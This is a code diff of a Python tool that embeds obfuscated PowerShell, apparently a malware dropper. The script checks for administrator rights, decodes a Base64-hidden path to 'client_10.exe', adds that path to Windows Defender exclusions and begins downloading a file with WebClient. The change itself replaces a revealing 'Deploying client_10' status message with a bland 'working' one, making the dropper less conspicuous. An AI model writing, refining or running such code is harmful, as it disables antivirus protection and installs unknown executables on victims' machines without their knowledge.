@@ -15,7 +15,6 @@ def direct_command():
     # Obfuscated PowerShell Logic
     # We use variable fragmentation and backticks to hide keywords
     raw_script = """
-    
 
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -38,7 +37,7 @@ if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
     $path = ($HOME + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFxjbGllbnRfMTAuZXhl'))))
     Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
 
-    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIERlcGxveWluZyBjbGllbnRfMTAuLi4='))) -ForegroundColor Cyan
+    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIHdvcmtpbmcgLi4u'))) -ForegroundColor Cyan
     try {
         if (!(Test-Path $path)) {
             $web = New-Object System.Net.WebClient
